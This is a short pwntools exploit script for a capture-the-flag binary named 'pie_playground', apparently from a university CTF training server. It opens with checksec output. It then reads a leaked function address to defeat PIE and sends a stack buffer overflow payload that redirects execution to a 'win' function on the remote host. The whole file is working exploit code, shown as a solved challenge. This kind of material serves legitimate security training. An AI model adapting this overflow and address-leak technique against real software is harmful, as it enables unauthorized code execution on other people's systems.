'''CHECKSEC
Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
'''

from pwn import *

DEBUG = 1
if DEBUG ==1: 
    context.log_level = "debug"
    
biname = "./pie_playground"    
context.binary = exe = ELF(biname)
rop = ROP(exe)
sussy_fun = exe.symbols["sussy"]
win_fun = exe.symbols['win']

#p = process(biname)
p = remote("cyberchallenge.diag.uniroma1.it", "5238")
p.recvuntil(b">")
p.send(b"sticazzi")
p.recvline()
p.recvline()
leak_sussy = p.recvline()
leak_sussy = int(leak_sussy[15:29],16)
base_pie = leak_sussy - sussy_fun
win_fun += base_pie


payload = b"A"*32 + b"B"*8 + p64(win_fun)
p.send(payload)
while(True): print(p.recvline())





